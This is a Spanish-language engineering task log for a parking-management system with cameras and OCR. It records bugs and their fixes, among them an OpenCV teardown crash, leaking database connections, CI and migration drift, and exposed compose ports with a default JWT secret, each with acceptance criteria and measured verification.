- **Contexto**: las lecturas del preview se ejecutan con `asyncio.to_thread` (hilo del pool). Si el cliente cerraba el stream mientras ese hilo seguía dentro de `cap.grab()`, el `finally` del generador llamaba a `cap.release()` **en paralelo con la lectura en vuelo**: OpenCV/FFmpeg liberaba las estructuras del decoder mientras otro hilo las usaba y el proceso **abortaba con SIGSEGV (exit 139)**. Reproducción: **4 de 4**. En QA el `--reload` lo disimula (parece una "recarga"), pero **en producción el backend entero cae cada vez que un operador cierra el modal**.
- **Resultado esperado**: cerrar el preview nunca puede tumbar el backend.
- **Criterios de aceptación**:
  - [x] Todas las llamadas a OpenCV serializadas con un `threading.Lock` (`CapturaSincronizada`).
  - [x] Test de regresión que **detecta** la carrera (comprobado: sin el lock, falla).
  - [x] Verificado en producción-like: uvicorn **sin `--reload`**, 5 cierres de preview seguidos → el proceso sigue vivo y `/health` sigue en 200.

### T-13+3 · P1 — cada stream retenía una conexión de PostgreSQL

- **Estado**: **completado** — 0 conexiones retenidas durante el stream
- **Contexto**: con `Depends(get_db)` la sesión (y su conexión del pool) se mantiene viva hasta que la respuesta termina, y en un endpoint de streaming eso es **toda la duración del stream**. Con el objetivo de 50 streams simultáneos, el pool (5 + 10 de salida) se agotaba y las conexiones quedaban *idle in transaction* al abortar el stream.
- **Resultado esperado**: los endpoints de streaming no retienen conexiones de la BD.
- **Criterios de aceptación**:
  - [x] El preview y el SSE resuelven auth + RBAC + la lectura que necesitan con una sesión **corta**, cerrada antes de emitir.
  - [x] El generador recibe un `CameraRef` (id + rtsp_url), no un modelo ORM vivo.
  - [x] Medido en el stack: durante el preview, **0** conexiones *idle in transaction* (antes: 1 por stream).

### T-13+4 · El heartbeat sondeaba en serie y hacía parpadear el worker de Celery

- **Estado**: **completado** — sondeo en paralelo y margen en el healthcheck
- **Contexto**: el healthcheck del worker es `celery inspect ping`, un **comando de control**: lo responde un worker cuando tiene un slot libre del pool. La ronda de heartbeat sondeaba las cámaras **de una en una** (5 s de timeout cada una), así que con 50 cámaras la ronda tardaba hasta ~250 s y **monopolizaba un slot**: el ping no se respondía dentro del límite y el contenedor pasaba a *unhealthy*. En Swarm/K8s eso significa **reemplazar el worker en bucle**, sin que la ronda llegue a terminar nunca.
- **Medido en este entorno**: el ping tardaba **16,5 s** con un healthcheck que admitía 10 s, y el contenedor alternaba entre `healthy` y `unhealthy`.
- **Criterios de aceptación**:
  - [x] Las cámaras se sondean **en paralelo** (`asyncio.gather` sobre `probe_camera`, que ya es async y delega en `to_thread`).
  - [x] El timeout del `inspect` es **menor** que el del healthcheck (`-t 20` con `timeout: 30s`), para que Docker no mate al contenedor que responde tarde.
  - [x] Test determinista que falla con el bucle secuencial (la tercera cámara sólo termina si las tres estaban a la vez).
- **Verificado**: con 2 cámaras la ronda bajó de 11,7 s a 9,6 s (y las dos a la vez); con 50 cámaras la diferencia es de ~250 s a ~5 s. El test nuevo falla con el código secuencial (0 ok en 3 s) y pasa con el paralelo (3 ok al instante). El worker queda `healthy` de forma sostenida.

### T-13+5 · La suite compartía Redis con la app en marcha (rate-limit intermitente)

- **Estado**: **completado** — la suite usa su propia base de Redis
- **Contexto**: los tests de rate-limit de endpoints fallaban de forma **intermitente** (2 o 4 fallos según la pasada). El contador del bucket `rl:users_create:actor:1` **se saltaba un valor** (2 → 4 en un solo POST) y el test veía un 429 antes de tiempo.
- **Causa**: la suite **compartía Redis con la app que está en marcha** en el mismo entorno (backend en `:8000`, worker de Celery, QA manual). Cualquier `POST /users` real hecho como admin —que en la BD de test también es el actor 1— incrementaba **el mismo bucket** que mide el test. Con el monitor de Redis se vio que los INCRaban del mismo proceso, pero el salto de +2 sólo se reproducía con tráfico de la app en paralelo.
- **Criterios de aceptación**:
  - [x] La suite apunta a una **base de Redis propia** (la 15) mediante `REDIS_URL`.
  - [x] Con la app real bombardeando `POST /users` como admin —la contaminación exacta que provocaba los fallos— el fichero de tests de rate-limit pasa **6/6** en dos pasadas.
- **Nota**: en CI el job ya tenía su propio Redis, pero aislar también allí hace que el resultado de los tests **no dependa de lo que esté haciendo la app** en ese momento.

### T-13+6 · P2 — cerrar y reabrir el preview daba 409, y el teardown congelaba el backend

- **Estado**: **completado** — corregido y verificado antes/después contra el código anterior
- **Contexto**: al cerrar el modal de previsualización y volver a abrirlo, el cliente recibía un **409** durante hasta ~8 s (el umbral de `STALE_AFTER_S`). Debajo había cuatro defectos encadenados:
  1. El `cap.release()` (teardown del RTSP) corría **en el hilo del event loop**. `CapturaSincronizada.release()` espera a la lectura en vuelo, que con la cámara colgada puede tardar hasta el timeout de FFmpeg (5 s): **el backend entero se congelaba**, no sólo ese stream.
  2. El slot de la cámara se liberaba en el `finally` del generador **externo** (`safe_gen`), que se ejecuta **después** del `finally` del generador **interno** (el que cierra la captura): el slot quedaba ocupado durante todo el teardown.
  3. La liberación dependía del **finalizador de generadores asíncronos** del event loop (Starlette cancela la tarea al abortarse la petición y el generador se cierra después): no era determinista y, en el peor caso, el slot se quedaba hasta el barrido de huérfanas.
  4. `release(camera_id)` no sabía **a qué sesión** pertenecía la llamada (LIMITACIÓN CONOCIDA documentada en su docstring): el `finally` de un generador viejo podía liberar la sesión de un cliente nuevo y matarle el stream.
- **Resultado esperado**: cerrar el preview libera la cámara de inmediato, reabrirla nunca da 409, y el teardown del RTSP no congela el backend.
- **Criterios de aceptación**:
  - [x] El slot se libera **antes** de la limpieza de la captura, y la liberación es **determinista** (no depende del finalizador de generadores ni del barrido de huérfanas).
  - [x] El teardown del `VideoCapture` se ejecuta **fuera** del hilo del event loop.
  - [x] `release`/`heartbeat` identifican **la sesión**: el `finally` de un generador viejo no puede tocar la sesión de un cliente nuevo.
  - [x] El registro de streams pasa a una API **síncrona** (una liberación con `await` puede ser cortada por una cancelación).
  - [x] Test de regresión con el **mismo fichero** ejecutado contra el código anterior y el nuevo: 3 de 4 fallaban antes (incluido el congelamiento del event loop: **5 ticks en 1 s** frente a ~100 ahora) y los 4 pasan ahora.
- **Nota**: el cierre y reapertura **a nivel de endpoint** ya funcionaba en el camino de cancelación; lo que no estaba garantizado era el orden, la determinación y la identidad de la sesión. El congelamiento del event loop sí era real y era lo más grave.
- **Revalidación bajo carga (2026-10-21)**: con el código corregido se regeneró la ejecución de referencia (6 usuarios, 180 s, 10 cámaras): **491 peticiones, 0 fallos, 0 cortes, 0 reinicios del worker y 0 previews descartados con un 409** → SLO **14 de 14** reglas OK (antes 13 de 13). Al revalidar salieron dos fallos del **instrumental**, corregidos:
  1. El locustfile leía en runtime `SOLIDAPP_CAMERA_IDS` (dos R) mientras la constante y el README documentan `SOLIDAPP_CAMARA_IDS` (una R): poner la variable documentada **no surtía efecto** y la ejecución se quedaba con la cámara 81 sola, la que provoca la contención. Ahora se aceptan los dos nombres.
  2. Los previews descartados con un 409 los cuenta Locust como **éxito** (un 409 es una regla de negocio, no un fallo HTTP), así que el SLO **no veía** la métrica clave del P2: una regresión habría pasado el CI sin que nadie se enterase. Nueva métrica `max_peticiones` (cuenta ocurrencias) y regla `mjpeg_sin_409` con umbral 0, con sus tests.
- **Segunda revalidación, con el código final del día** (después de los arreglos de móvil, del correo de cámara caída y de `/health/ready`): **467 peticiones, 0 fallos, 14 de 14 reglas**, 0 previews descartados con un 409 y 0 cortes de stream en 66 conexiones. Informe: `backend/locust/reports/2026-10-21-revalidacion.json`. El número de peticiones baja un poco porque depende del ritmo de la máquina, no del código: lo que se compara son los percentiles y los fallos, y se mantienen.
- **CI replicado a mano** (el CI remoto no arranca por la facturación): `ruff check app tests` en verde, `mypy app` sin errores nuevos, pytest en SQLite y PostgreSQL, `pytest tests/test_sqlite_only_functions.py` (paso aparte del job de integración), `vue-tsc --noEmit`, `npm run build`, **build de las dos imágenes Docker** (exit 0), usuario no-root `app` y log rotado en `/var/log/solidapp/backend.log` comprobados como hace el job `docker-build`, y QA visual headless (19 pantallas sin incidencias, 0 errores de consola).

### T-13+7 · P3 — la tabla de Operadores no cabía en su tarjeta y la columna "Estado" quedaba cortada

- **Estado**: **completado** — corregido y verificado a 1232 px
- **Contexto**: encontrado en la **QA visual en el navegador integrado** (no en la headless), con la ventana del panel lateral a 1232 px. En `/gestor/operadores`, la tabla vive en media rejilla (`lg:grid-cols-2`): la tarjeta mide ~435 px y la tabla necesita ~470 px (el correo largo no cede), así que la columna **"Estado"** (los badges "Activo") quedaba **cortada a media**. En el navegador se veía el badge a medio dibujar.
- **Por qué la QA headless no lo veía**: el script recorría las pantallas a 1440 px, donde la columna sí cabe. El defecto sólo aparece por debajo de ~1280 px.
- **Al medirlo apareció más**: la comprobación de desbordamiento encontró **4 recortes más** en el mismo ancho — Cámaras (950 px en 928), Planes (887 en 611), Usuarios (650 en 611) y Tarifas (744 en 611). Los tres últimos están dentro de una tarjeta con `overflow-hidden`: la tabla se **recortaba** sin forma de llegar al resto.
- **Criterios de aceptación**:
  - [x] El script de QA visual **detecta** contenido que no cabe (recortado o desbordado) y sale con código 1 si lo hay.
  - [x] El script permite elegir el ancho del viewport (`--ancho`), y la QA se pasa a 1232 px además de a 1440 px.
  - [x] Las 5 tablas que no caben están envueltas en un contenedor `overflow-x-auto` con `min-w-max`: **0 desbordes a 1232 px** (antes 5).
  - [x] Sin regresión a 1440 px: 0 desbordes y 0 errores de consola en las 21 pantallas.
  - [x] `vue-tsc --noEmit` y `npm run build` en verde.
- **Nota de alcance**: el arreglo es el desplazamiento horizontal en la
  tarjeta, no un rediseño. Con ventana ancha se ve exactamente igual que
  antes.
- **Ampliado a 1024 px** (el ancho de tablet, con el menú colapsado): salió
  un defecto más, la etiqueta **"Minutos/fracción"** de Tarifas, que era un
  único token sin espacios (98 px) en una caja de 86 px y se salía de su
  columna. Ahora dice "Minutos por fracción", que parte en dos palabras como
  la etiqueta de al lado. Con la QA a 1024, 1232 y 1440 px: **0 desbordes y
  0 errores de consola** en las 21 pantallas.
- **El detector excluye a propósito** los controles de formulario
  (`select`, `input`, `textarea`), que el navegador recorta de forma nativa
  con puntos suspensivos, y los elementos posicionados en absoluto o fijo.
  Sin esas exclusiones el detector marcaría ruido y nadie lo miraría.

### T-13+9 · P2 — en el móvil (414 px) la página entera se desplazaba de lado a lado

- **Estado**: **completado** — corregido y verificado a 414 px
- **Contexto**: la QA visual recorría cuatro anchos (768, 1024, 1232 y 1440 px), pero **ninguno era de móvil**: el más estrecho era una tablet vertical. Al añadir el ancho de un móvil (414 px) aparecieron **26 contenidos desbordados en 6 de las 21 pantallas**, y **3 pantallas con la página entera desplazable** de lado a lado (Movimientos, Operadores y Tickets). En un teléfono, el usuario tenía que mover la ventana para ver el final de una tabla.
- **Por qué**: un `<table>` no baja del ancho de su contenido. Sin un contenedor con `overflow-x-auto`, la tabla se sale de su tarjeta; y dentro de una rejilla o de un flex, el `min-width: auto` del ítem lo ata a la anchura mínima de su contenido, así que la columna no encoge y la página hereda el desbordamiento.
- **El arreglo tiene dos partes y con una sola no basta**:
  1. Envolver la tabla en un `div` con `overflow-x-auto` y `min-w-max` **dentro** del atributo `class` de la tabla.
  2. Poner `min-w-0` **en el ítem de la rejilla** que contiene la tabla. Con sólo la parte 1, el envoltorio se encoge pero la columna sigue midiendo lo que mide la tabla, y la página sigue desbordando. Se comprobó midiendo: el `<section>` de Operadores seguía con `min-width: auto` y 611 px de ancho en una columna de 366.
- **Cómo se localizó sin adivinar**: `frontend/scripts/sonda_anchura.py` (nuevo) mide la cadena de ancestros del elemento más ancho, con su `min-width` calculado, su `overflow-x` y su `display`. Es lo que distingue "este elemento es el culpable" de "este otro sólo lo arrastra".
- **Herramienta**: `tools/envolver_tablas.py` (nuevo) aplica la parte 1 a todas las vistas de forma mecánica. Dos detalles que la herramienta tiene que respetar y que costaron un 500 al principio: mueve la directiva `v-if`/`v-else` al envoltorio (si se deja en la tabla, Vue no compila: *"v-else has no adjacent v-if or v-else"*) y añade `min-w-max` **dentro** del atributo `class` (fuera, `<table class="w-full" min-w-max>` no significa nada).
- **Criterios de aceptación**:
  - [x] La QA visual recorre el ancho de móvil (414 px).
  - [x] Las 8 tablas que no caben están envueltas en un contenedor `overflow-x-auto min-w-0`.
  - [x] Los ítems de rejilla que contienen tablas llevan `min-w-0`.
  - [x] **0 desbordes a 414 px** (antes 26, en 6 pantallas) y **0 pantallas con scroll horizontal de página** (antes 3).
  - [x] Sin regresión: **0 desbordes** en las 21 pantallas a 768, 1024, 1232 y 1440 px.
  - [x] 0 errores de consola y 0 peticiones fallidas en los **cinco** anchos.
  - [x] `vue-tsc --noEmit` y `npm run build` en verde.
- **Otro arreglo de la QA**: las pantallas de mapa y de vídeo en directo nunca dejan de cargar (teselas del mapa y flujo SSE), así que la espera de "networkidle" se agotaba siempre ahí y se reportaba como **error de red**. Ahora se reporta como **aviso**: es tráfico de fondo perpetuo, no una pantalla rota.

### T-13+10 · P2 — el texto corrupto podía llegar al commit sin que nada lo parase

- **Estado**: **completado** — puerta añadida al CI y verificada en local
- **Contexto**: al modelo de lenguaje se le cuelan con facilidad caracteres de otros alfabetos (CJK, cirílico, coreano) al escribir en español. No es hipotético: **pasó dos veces en esta misma sesión**, una en un docstring (una palabra china colada entre dos españolas) y otra en un **identificador de JavaScript** (con caracteres CJK), que dejó una vista entera en blanco con un 500. El escáner ya existía (`tools/escanear_texto.py`), pero era un paso manual: nada obligaba a pasarlo antes de commitear.
  > Los ejemplos no se reproducen literalmente: si estuvieran en el repo, la puerta que se describe aquí los detectaría a ellos mismos.
- **Arreglo**: el escáner pasa a ser **una puerta del CI**. Nuevo modo `--tracked`, que escanea **exactamente lo versionado** por git (ni `node_modules`, ni `dist`, ni ficheros generados): lo que se va a publicar es lo que se comprueba. Sale con código 1 si encuentra algo.
- **Dónde está el paso**: en el job `backend`, **antes de instalar dependencias**. El escáner es sólo biblioteca estándar, así que falla en dos segundos en vez de esperar al `pip install`.
- **Criterios de aceptación**:
  - [x] `python tools/escanear_texto.py --tracked` escanea todo lo versionado.
  - [x] El repo entero está limpio: **0 problemas en 312 ficheros versionados**.
  - [x] El paso está en `.github/workflows/ci.yml` y `actionlint` sale con 0.
  - [x] El ejecutor local (`tools/ejecutar_ci_local.py`) lo ejecuta y pasa.
- **Arreglo del ejecutor local**: `tools/ejecutar_ci_local.py` **ignoraba `continue-on-error`**, así que declaraba el job "backend" en rojo por el paso de `mypy`, que el workflow tolera a propósito (lleva `continue-on-error: true` desde el primer commit). Ahora reproduce la semántica de Actions: el paso se marca como fallido, **el job sigue** y el veredicto es el real.
- **Nota de verdad**: `mypy app` **no está en verde** (77 errores en 32 ficheros, en modo `strict`). No es una regresión de este trabajo: el paso del CI lo toleró desde el primer commit. La cabecera de este documento lo decía mal (decía 78 en 33) y ya está corregido.

### T-24+1 · Verificar que el PWA es instalable y arranca sin red (propuesto, no ejecutado en CI)

- **Estado**: **completado en local** · **pendiente de meter en el CI**
- **Contexto**: la QA visual recorre las pantallas del cliente, pero nadie
  miraba lo que hace que una PWA sea instalable. Un icono que devuelve 404,
  un manifiesto mal formado o un service worker que no toma el control sólo
  se ven cuando el usuario intenta instalar la app: y entonces ya es tarde.
- **Qué se ha hecho**: `frontend/scripts/qa_pwa.py` comprueba el manifiesto
  (campos que Chrome exige y tamaños 192/512), que **cada icono se sirva
  con 200**, que el *service worker* se registre, quede activo y **tome el
  control**, y que **la app arranque sin red** (se corta la red, se recarga
  y la pantalla tiene que salir de la caché).
- **Resultado medido (2026-10-21)**: manifiesto OK con 4 iconos y
  `display=standalone`; service worker activo y controlando con 44 entradas
  precacheadas; la app **arranca sin red**. El PWA es instalable.
- **Por qué no entra en el CI todavía**: el job de frontend corre en una
  imagen de Node sin Python ni navegadores; hacer la comprobación allí
  exigiría instalar Playwright y Chromium (+~500 MB y minutos de descarga).
  Y con la facturación de la cuenta resuelta **no se puede validar un
  cambio del workflow**, porque los jobs no arrancan: meter algo que no se
  ha podido probar en el CI es exactamente la forma de dejar el CI en rojo
  sin querer. Queda documentado para cuando el CI vuelva a estar en
  marcha.

### T-25+1 · El inventario de la API se había quedado en 61 de 99 endpoints (y dos rutas estaban registradas dos veces)

- **Estado**: **completado** — inventario regenerado y con comprobación automática
- **Contexto**: `docs/API-INTERNAL.md` (T-25) decía "61 endpoints en 18 grupos", pero la API ya tenía **99**. El documento no se había revisado desde antes del Bloque 3 (planes, incidencias y adjuntos, operadores de sucursal, plantillas faciales, informes, KPIs, PWA del cliente...). La propia sección 6 del documento avisa de que "se actualiza el documento, no al revés", pero no había forma mecánica de saber que estaba desfasado.
- **Al construir el verificador salieron dos defectos de código**:
  1. `POST /users/{user_id}/memberships` y `POST /vehicles/{vehicle_id}/users` tenían **el decorador `@router.post` duplicado**: la ruta se registraba dos veces y FastAPI avisaba en cada arranque con *"Duplicate Operation ID"*, ensuciando el OpenAPI (que es la fuente de la que sale el inventario). Corregido: el aviso desaparece.
  2. La columna "Quién" de dos endpoints no se podía leer del `Depends`: el preview y el SSE llaman a la dependencia **a mano** dentro del cuerpo (el patrón "opt-in por endpoint"), y `logout`/`logout/all` dependen del `AuditMiddleware`, que valida el token Bearer y deja el contexto en `request.state.audit`. El extractor reconoce los tres patrones.
  3. Y además, las dependencias dicen **quién puede llamar** al endpoint, pero no **qué datos ve**: varios endpoints filtran por rol y por membresía a mano en el cuerpo (para no duplicar el JOIN con `parking_context`). La columna "Quién" tiene ahora dos partes: el RBAC de dependencia y el ámbito de datos (`ámbito: membresías de sucursal`, `ámbito: sus vehículos`). El extractor sigue el filtro hasta las **funciones auxiliares** del módulo (`_scoped_query`, `_resolve_parking_id`, `_vehiculos_del_cliente`), distingue filtrar de construir y descarta las anotaciones de tipo.
- **Criterios de aceptación**:
  - [x] `tools/extraer_api.py` extrae rutas y RBAC del código con `ast` y **se valida contra el OpenAPI real** (si se le escapa una ruta, sale con código 1).
  - [x] `tools/generar_seccion_api.py --escribir` regenera la sección 3 del documento.
  - [x] `tools/verificar_api_doc.py` detecta la deriva entre el documento y el código.
  - [x] El inventario documenta los **99 endpoints** con su RBAC real, y el verificador dice "El inventario coincide con el código".
  - [x] Sin avisos de *Duplicate Operation ID* al arrancar.
  - [x] Suite en verde (530 passed en SQLite) tras quitar los decoradores duplicados.

### T-25+2 · Dos endpoints sin ningún test: el OCR de placas

- **Estado**: **completado** — 99 de 99 endpoints con test
- **Contexto**: al medir la cobertura de tests sobre la API (nuevo `tools/cobertura_api.py`) salió que **2 de los 99 endpoints no los ejercitaba ningún test**:
  - `GET /api/v1/parkings/{parking_id}/plates-detected`
  - `POST /api/v1/parkings/{parking_id}/cameras/{camera_id}/plates`

  Son los endpoints que empujan y listan las lecturas del OCR. Nadie había comprobado nunca su RBAC, su validación ni su alcance.
- **Criterios de aceptación**:
  - [x] Los dos endpoints tienen test de 401 (sin token), 403 (sin membresía), 404 (cámara de otra sucursal) y 422 (payload inválido).
  - [x] Se comprueba el **alcance**: el listado no filtra matrículas de otra sucursal, y ordena de la más reciente a la más antigua.
  - [x] Se comprueba el filtro `camera_id` y la validación de `limit` (0 y 501 → 422; defecto 50, tope 500).
  - [x] El POST persiste una fila por hit (la auditoría de la lectura OCR) y devuelve el resultado de la ingesta.
  - [x] Cobertura final: **99 de 99** (96 con la ruta literal en el test, 3 con URL parametrizada).
- **Nota**: el medidor distingue tres estados —ruta literal, URL parametrizada
  (`f"/api/v1/admin/reports/{informe}.pdf"`, que sí ejercita el endpoint pero no
  se puede emparejar) y sin cobertura— para no dar por cubierto algo que no lo
  está, ni alarmar por algo que sí lo está.
- **Hasta dónde da el medidor**: además de "¿tiene test?", el script informa de
  "¿tiene un test que compruebe el 401/403?". Ese segundo dato sale
  **indicativo**, con falsos positivos: muchos tests comprueban la denegación
  construyendo la URL en una variable (`for ruta in ("/plazas", "/tickets")`),
  así que el emparejamiento literal no las ve. Por eso la puerta del script es
  "todo endpoint tiene algún test" (99 de 99), no la de denegación.
- **Y en el CI**: el job de integración ejecuta ahora
  `python ../tools/verificar_api_doc.py`, que compara **la sección 3 entera**
  (no sólo las rutas: también la columna "Quién" con el ámbito de datos) con lo
  que genera el código. Así el inventario no puede volver a quedarse atrás sin
  que el CI lo diga. Al añadir la comparación completa salió un fallo real: el
  orden de los ámbitos no era determinista (venía de un `set`), así que la
  sección generada podía cambiar entre ejecuciones. Corregido ordenando.
- **Validado**: `actionlint` sobre el workflow (exit 0) y el comando exacto
  del CI ejecutado desde `backend/`, que es el `working-directory` del job.

### T-25+3 · P2 — los modelos y las migraciones contaban dos historias distintas

- **Estado**: **completado** — deriva cerrada, migración `0014` y comprobación en el CI
- **Contexto**: no estaba en el plan. Salió al ejecutar `alembic check` (la herramienta estándar para comparar los modelos con el esquema) y descubrir dos cosas:
  1. **`alembic check` no servía para nada**: comparaba los modelos contra la base ENTERA, incluidas las tablas TIGER/Line que trae la imagen de PostGIS y la geometría que crea `infra/seed.sql`. Faltaba el `include_object` que filtra por las tablas del proyecto.
  2. **Con el filtro puesto, la deriva real era de 8 puntos, en los dos sentidos**:
     - Los modelos declaraban `index=True` en `cameras.code`, `parking_spaces.number`, `camera_geofences.parking_space_id` y `tickets.parking_space_id`, y **ninguna migración creó esos índices**: se crearon las columnas y ya. Sin índice, cada listado es un Seq Scan.
     - La migración inicial (0001) creó en las columnas con unicidad *las dos cosas*: la restricción `UNIQUE` (`users_email_key`…) **y** un índice único (`ix_users_email`…). El modelo, con `unique=True, index=True`, produce **sólo** el índice. La base arrastraba cuatro restricciones de sobra.
  3. Y al revés: las migraciones 0007 y 0008 crearon `ix_audit_logs_user_id_created_at` e `ix_audit_logs_created_at` **a propósito** (son consultas de auditoría), pero el modelo no los declaraba → `alembic check` quería borrarlos.
- **Lo que habría pasado si nadie lo miraba**: `alembic check` fallaba, así que el siguiente que autogenerase una migración se habría llevado por delante un `DROP CONSTRAINT` de las cuatro unicidades: **emails, matrículas y códigos habrían dejado de ser únicos** sin que nadie se enterase. Por eso la migración va escrita a mano, con un `downgrade` que las restituye.
- **Criterios de aceptación**:
  - [x] `alembic/env.py` filtra la comparación: sólo las tablas del proyecto, y ni `parkings.geom` ni su índice espacial (los crea `infra/seed.sql`).
  - [x] Los tres índices que las migraciones crearon a propósito están declarados en los modelos.
  - [x] Migración `0014_indices_y_uniques`: crea los 4 índices que faltaban y quita las 4 restricciones `UNIQUE` redundantes. **La unicidad no se pierde**: la garantiza el índice único, comprobado insertando un email duplicado (rechazado con `ix_users_email`).
  - [x] `alembic upgrade head` sobre una base **vacía** aplica las 14 migraciones sin error, y `alembic check` responde *No new upgrade operations detected*.
  - [x] El `downgrade` de la 0014 se probó (restaura las restricciones y quita los índices) y se vuelve a subir.
  - [x] **El CI lo vigila**: los tests crean el esquema con `create_all`, es decir, **no ejecutan las migraciones** (una migración rota sólo se habría visto en producción). El job de integración ahora levanta una base vacía, migra de cero y comprueba que el esquema coincide con los modelos.
- **Nota**: `alembic check` sólo funciona contra PostgreSQL (las migraciones usan `CREATE EXTENSION postgis`).

### T-25+4 · P2 — nadie había probado un despliegue limpio de verdad

- **Estado**: **completado** — smoke test en local y en el CI
- **Contexto**: las migraciones se ejecutaban sobre la base de QA (que ya estaba sembrada) y el seed se ejecutaba a mano, pero **nunca los tres juntos sobre una base vacía**. Un despliegue roto —una migración que no aplica sobre el esquema limpio, o un seed que usa una columna que ya no existe— sólo se habría visto en el primer cliente.
- **Criterios de aceptación**:
  - [x] `tools/verificar_despliegue_limpio.py`: crea una base **vacía**, la migra de cero, la siembra, levanta la aplicación y comprueba que la API responde con los datos del seed. Borra la base al terminar.
  - [x] Resultado medido: 14 migraciones aplicadas, seed completo (5 parkings × 60 plazas, 4 usuarios, 3 planes, 5 tarifas, 2 membresías) y la API respondiendo (login 200, `/parkings` 5, `/plans` 3, `/users` 4, resumen de tickets 200).
  - [x] El seed es **idempotente**: ejecutarlo dos veces da los mismos recuentos.
  - [x] El CI lo ejecuta en el job de integración.
- **Nota**: el script usa `psycopg` (que ya es dependencia del backend) y no `psql`, para que no dependa de que el cliente esté en la imagen.

### T-25+5 · P2 — la infraestructura del compose quedaba expuesta en la red de la sucursal

- **Estado**: **completado** — puertos en loopback y arranque bloqueado con el secreto de ejemplo
- **Contexto**: salió al revisar la higiene de un repositorio **público** (búsqueda de secretos en el árbol y en el historial). Dos cosas:
  1. **La superficie de red**: el `docker-compose.yml` del repo **es** el que se copia a una sucursal (ADR-0001, opción D: Compose en el edge). Publicaba Postgres (`5432:5432`, con la contraseña `parking` escrita en el repo) y **Redis (`6379:6379`, sin contraseña ninguna**, y ahí vive la blacklist de tokens y el estado de sesión), además de OCR, detector, Loki y Grafana (con `admin/admin`). Todo en `0.0.0.0`: cualquiera de la red de la sucursal podía leer la base de datos entera, invalidar tokens ajenos o mirar los logs.
  2. **El secreto JWT**: `JWT_SECRET: ${JWT_SECRET:-change-me-in-production}`. Si a una sucursal se le olvidaba la variable, la API firmaba los tokens con un secreto público: se podía fabricar el token de un administrador.
- **Criterios de aceptación**:
  - [x] La infraestructura (db, redis, ocr, vehicle-detector, loki, grafana) se publica **sólo en loopback**. La API (8000) y el frontend (5173) siguen publicados: el central y los dispositivos de la sucursal los necesitan.
  - [x] **Comprobado**: desde la IP de la red local los puertos 5432, 6379 y 3000 ya no responden; desde el host, sí. Los servicios se siguen hablando por la red de Docker.
  - [x] La aplicación **se niega a arrancar** en `staging`/`production` con el secreto de ejemplo (10 tests nuevos en `tests/test_config_seguridad.py`). En `development` y `test` no se comprueba: el equipo de QA usa ese valor a propósito.
  - [x] Documentado en el ADR-0001, con la tabla de qué puerto necesita quién.
- **Lo que queda para el despliegue real** (follow-up ya anotado en el ADR):
  el `docker-compose.prod.yml` con los valores por entorno (`JWT_SECRET`,
  `CORS_ORIGINS` correctos para el host de la sucursal) y el script de
  alta `infra/deploy/branch.sh`.

### T-25+6 · P3 — dos fallos que sólo aparecían fuera del contenedor

- **Estado**: **completado** — corregidos y verificados en los dos entornos
- **Contexto**: salieron al **ejecutar el job de integración del CI en local**, leyendo el workflow (herramienta nueva `tools/ejecutar_ci_local.py`). La QA y la suite se habían hecho siempre dentro del contenedor, que tiene dos diferencias con el portátil del equipo: la zona horaria (UTC) y la resolución de nombres de Docker.
- **Los dos fallos**:
  1. **Una cámara sin URL de RTSP hacía escupir aserciones de OpenCV.** Con la URL vacía, `cv2.VideoCapture` revienta con una aserción de C++ ("!_filename.empty()") cada vez que se abre: en el sondeo del heartbeat, en el preview y en la captura de un frame. El alta ya lo impedía (`CameraCreate.rtsp_url`, `min_length=8`), pero **el PATCH no**: `CameraUpdate.rtsp_url` no tenía ninguna restricción, así que un `PATCH {"rtsp_url": ""}` dejaba la cámara rota **para siempre** en la BD (y con ella el heartbeat, que además abría una alerta de "cámara caída").
     - El esquema del PATCH ahora exige lo mismo que el alta.
     - Además, los tres servicios que abren la captura comprueban la URL antes de llamar a OpenCV y devuelven el fallo de forma limpia (por si queda alguna cámara sin URL de antes, o escrita a mano en la BD).
  2. **Un test del heartbeat sólo pasaba si la máquina estaba en UTC.** El heartbeat guarda `datetime.now(timezone.utc)` y el test comparaba ese valor (naive) con `datetime.now()`, que es la hora **local**: con un desfase de una o dos horas, la aserción "age < 5 s" fallaba con *"last_heartbeat_at demasiado antiguo"*. En CI y en el contenedor pasaba (los dos en UTC), así que el falso rojo sólo se veía al ejecutar la suite en el portátil del equipo. Ahora la comparación es UTC contra UTC.
- **Herramientas nuevas que lo destaparon**:
  - `tools/ejecutar_ci_local.py`: ejecuta un job del workflow **leyendo el YAML** (no duplicando los pasos), con su `working-directory` y sus variables → comprueba el cableado real, no sólo los comandos.
  - `tools/revisar_esquemas.py`: busca asimetrías de validación entre los esquemas `Create` y `Update`. Ahora no hay ninguna (el `rtsp_url` era la única).
- **Criterios de aceptación**:
  - [x] El PATCH de una cámara rechaza una URL vacía o demasiado corta (8 tests nuevos en `tests/test_camara_sin_url.py`).
  - [x] Con la URL vacía, el preview, el heartbeat y la captura fallan de forma limpia, sin llamar a OpenCV.
  - [x] El test del heartbeat pasa en el host (UTC+2) **y** en el contenedor (UTC).
  - [x] Ninguna asimetría Create/Update en los esquemas.

### T-26 · P1 — la alerta de "cámara caída" nunca enviaba el correo al administrador

- **Estado**: **completado** — corregido, con test que demuestra el fallo
- **Contexto**: no estaba en el plan. Salió al leer la salida de `mypy app` (que el CI no ejecuta de verdad desde hace meses, así que nadie lo había visto): `app/services/email.py:193: error: Name "_render_camera_offline" is not defined`.
- **El bug**: desde el sprint CAMERA_OFFLINE (2026-07-01) existen las plantillas `alerts/camera_offline.{txt,html}.j2`, pero **la función que las renderiza nunca se definió**. `send_alert_email` la llamaba, el `NameError` lo capturaba el `except` general, y la función devolvía `False` con un `log.warning`: **la alerta de cámara caída se guardaba en la BD pero el correo al administrador no salía nunca**. En silencio, y con la alerta ya visible en el panel, así que nadie se enteraba.
- **Por qué no lo detectaron los tests**: todos los tests de alertas **simulan** `send_alert_email` con `monkeypatch` (justo la función que contenía el bug), así que nunca entraban en el renderizado. El `noqa: F821` que llevaba el código silenciaba al linter para que el CI no bloqueara.
- **El arreglo**:
  - Se implementa `_render_camera_offline` en `app/services/email.py`, con el mismo patrón que `_render_ocr_failed` y el mismo contexto que la plantilla ya pedía (`alert_id`, `camera_code`, `parking_name`, `severity`, `count`, `threshold`, `detected_at`, `dashboard_url`).
  - Se retira el comentario que lo daba por pendiente y el `noqa: F821`.
  - `mypy app` baja de 78 a 77 errores y el `NameError` desaparece.
- **Criterios de aceptación**:
  - [x] `_render_camera_offline` existe y renderiza las dos plantillas.
  - [x] `send_alert_email(..., template_kind="camera_offline")` devuelve `True` (antes `False`).
  - [x] Test nuevo `backend/tests/test_email_templates.py` (6 tests) que llama al código **real** en modo dry-run, sin simular `send_alert_email`.
